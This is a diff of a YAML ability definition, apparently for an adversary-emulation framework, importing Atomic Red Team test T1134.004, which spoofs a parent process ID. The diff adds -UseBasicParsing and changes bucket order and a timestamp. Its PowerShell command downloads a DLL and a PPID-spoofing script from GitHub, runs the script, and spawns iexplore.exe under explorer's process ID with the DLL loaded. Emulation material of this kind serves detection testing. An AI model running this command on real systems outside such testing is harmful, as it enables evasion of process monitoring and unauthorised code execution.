@@ -20,13 +20,14 @@
         command: 'if (Test-Path "PathToAtomicsFolder\T1134.004\bin\calc.dll") {exit
           0} else {exit 1}; then : ; else New-Item -Type Directory (split-path "PathToAtomicsFolder\T1134.004\bin\calc.dll")
           -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1134.004/bin/calc.dll"
-          -OutFile "PathToAtomicsFolder\T1134.004\bin\calc.dll"; fi; if (Test-Path
-          "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1") {exit 0} else {exit
-          1}; then : ; else New-Item -Type Directory (split-path "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1")
+          -OutFile "PathToAtomicsFolder\T1134.004\bin\calc.dll" -UseBasicParsing;
+          fi; if (Test-Path "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1") {exit
+          0} else {exit 1}; then : ; else New-Item -Type Directory (split-path "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1")
           -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1134.004/src/PPID-Spoof.ps1"
-          -OutFile "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1"; fi; . "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1";
-          $ppid=Get-Process explorer | select -expand id; PPID-Spoof -ppid $ppid -spawnto
-          "C:\Program Files\Internet Explorer\iexplore.exe" -dllpath "PathToAtomicsFolder\T1134.004\bin\calc.dll"'
+          -OutFile "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1" -UseBasicParsing;
+          fi; . "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1"; $ppid=Get-Process
+          explorer | select -expand id; PPID-Spoof -ppid $ppid -spawnto "C:\Program
+          Files\Internet Explorer\iexplore.exe" -dllpath "PathToAtomicsFolder\T1134.004\bin\calc.dll"'
         cleanup: Stop-Process -Name "#{dll_process_name}" -ErrorAction Ignore; Stop-Process
           -Name "#{spawnto_process_name}" -ErrorAction Ignore
   plugin: atomic
@@ -35,9 +36,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - t1134.004
-  - atomic-red-team
   - privilege-escalation
+  - atomic-red-team
+  - t1134.004
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -72,7 +73,7 @@
         ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1134.004/bin/calc.dll"
-        -OutFile "#{dll_path}"
+        -OutFile "#{dll_path}" -UseBasicParsing
 
         '
     - description: 'PPID.ps1 must exist on disk at $PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1
@@ -86,9 +87,9 @@
         -ErrorAction ignore | Out-Null
 
         Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1134.004/src/PPID-Spoof.ps1"
-        -OutFile "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1"
+        -OutFile "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1" -UseBasicParsing
 
         '
     technique_created: '2020-02-18T18:22:41.448Z'
     atomic_guid: 069258f4-2162-46e9-9a25-c9c6c56150d2
-    import_timestamp: '2026-10-20T07:08:27.374678Z'
+    import_timestamp: '2026-10-21T07:01:50.035115Z'
